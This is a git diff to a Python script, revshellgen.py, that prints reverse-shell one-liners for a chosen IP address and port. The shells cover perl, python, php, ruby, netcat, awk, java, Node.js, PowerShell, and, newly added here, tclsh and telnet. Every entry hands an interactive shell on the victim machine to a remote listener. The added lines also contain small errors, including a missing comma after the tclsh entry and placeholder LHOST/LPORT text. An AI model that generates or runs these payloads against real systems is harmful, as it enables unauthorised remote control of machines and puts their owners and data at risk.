@@ -3,7 +3,7 @@
 import argparse
 
 def parse_options():
-    
+
     parser = argparse.ArgumentParser(description='python revshellgen.py -i 127.0.0.1 -p 4444 -t bash')
     parser.add_argument("-i", "--ipaddr", type=str, help="IP address to connect back to", required=True)
     parser.add_argument("-p", "--port", type=int, help="Port to connect back to", required=True)
@@ -21,7 +21,8 @@ def main(args):
         'perl':'perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' % (ipaddr, port),
         'python':'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"' % (ipaddr, port),
         'php':'php -r \'$sock=fsockopen("%s",%d);exec("/bin/sh -i <&3 >&3 2>&3");' % (ipaddr, port),
-        'ruby':'ruby -rsocket -e\'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/sh -i <&3 >&3 2>&3\",f,f,f)' % (ipaddr, port),
+        'ruby':'ruby -rsocket -e \'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/sh -i <&3 >&3 2>&3\",f,f,f)' % (ipaddr, port),
+        'ruby2':'ruby -rsocket -e \'c=TCPSocket.new("%s",%d);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' % (ipaddr, port),
         'nc':'nc -e /bin/sh %s %d' % (ipaddr, port),
         'nc1':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f' % (ipaddr, port),
         'nc2':'rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc %s %d 1>/tmp/l' % (ipaddr, port),
@@ -31,7 +32,10 @@ def main(args):
         'awk':'awk \'BEGIN {s = "/inet/tcp/0/%s/%d"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null' % (ipaddr, port),
         'java':'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()' % (ipaddr, port),
         'nodejs':'(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(%s, "%d", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();' % (ipaddr, port),
-        'psh':'$client = New-Object System.Net.Sockets.TCPClient(\'%s\',$d); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \'; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();'  % (ipaddr, port)
+        'psh':'$client = New-Object System.Net.Sockets.TCPClient(\'%s\',%d); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \'; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();'  % (ipaddr, port),
+        'tclsh':'echo \'set s [socket %s %d];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh' % (ipaddr, port)
+        'telnet':'telnet LHOST LPORT | /bin/bash | telnet %s %d'  % (ipaddr, port),
+        'telnet2':'rm -f /tmp/p; mknod /tmp/p p && telnet %s %d 0/tmp/p'  % (ipaddr, port)
     }
 
     if args.shelllist:
@@ -44,7 +48,7 @@ def main(args):
     else:
         for t,shell in shells.items():
             print("{}\n".format(shell))
-        
+
 if __name__ == "__main__":
 
     args = parse_options()
